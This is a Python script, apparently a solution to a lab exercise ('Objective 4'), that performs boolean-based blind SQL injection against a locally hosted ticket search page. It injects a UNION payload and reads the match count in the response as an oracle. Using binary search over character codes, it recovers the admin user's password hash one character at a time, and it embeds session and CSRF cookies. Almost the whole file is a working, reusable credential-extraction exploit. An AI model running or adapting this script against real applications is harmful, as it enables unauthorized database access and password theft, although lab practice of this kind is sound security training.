"""
Objective 4 - Boolean-based blind SQL injection
Recovers auth_user.password for username='admin' one character at a time,
using only the match-count oracle (no data is ever reflected in the response).
"""
import re
import requests

BASE = "http://127.0.0.1:5001/tickets/search/"

# Grab a fresh sessionid/csrftoken from Burp before running.
COOKIES = {
    "csrftoken": "NvgGviz5La4wMfR4tEFswoWVTgb6C3Xa",
    "sessionid": "g0bvxofpwz56jx49gn7wb3s2og5pjjc9",
}
HEADERS = {"User-Agent": "Mozilla/5.0"}

SUBQUERY = "SELECT password FROM auth_user WHERE username='admin'"

def oracle(condition_sql: str) -> bool:
    """True if the injected UNION row appears (i.e. condition_sql is true)."""
    payload = f"zzzz' UNION SELECT NULL,'x',NULL,NULL WHERE {condition_sql}--"
    r = requests.get(BASE, params={"q": payload}, cookies=COOKIES, headers=HEADERS)
    m = re.search(r"(\d+)\s+match", r.text)  # matches "1 match." and "N matches."
    count = int(m.group(1)) if m else 0
    return count > 0

def get_length(subquery: str) -> int:
    lo, hi = 0, 200
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"LENGTH(({subquery})) > {mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def get_char(subquery: str, pos: int) -> str:
    lo, hi = 32, 126 
    while lo < hi:
        mid = (lo + hi) // 2
        cond = f"ascii(substring(({subquery}) from {pos} for 1)) > {mid}"
        if oracle(cond):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

def main():
    length = get_length(SUBQUERY)
    print(f"[+] Password length: {length}")
    result = ""
    for pos in range(1, length + 1):
        c = get_char(SUBQUERY, pos)
        result += c
        print(f"[{pos}/{length}] {result}")
    print(f"\n[+] Recovered hash: {result}")

if __name__ == "__main__":
    main()